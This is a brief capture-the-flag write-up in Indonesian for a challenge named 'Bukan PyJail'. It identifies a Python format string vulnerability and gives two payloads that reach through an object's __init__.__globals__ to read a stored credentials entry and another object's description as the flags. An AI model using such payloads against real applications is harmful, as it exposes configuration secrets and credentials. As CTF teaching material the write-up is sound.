# Bukan PyJail

Description: 
Author: daffainfo

### Cara Solve

Format string vulnerability
* Untuk mendapatkan flag 1:
```
{people_obj.__init__.__globals__[CONFIG][DATABASE][CREDENTIALS][DESCRIPTION][1]}
```
* Untuk mendapatkan flag 2:
```
{people_obj.__init__.__globals__[people].description}
```
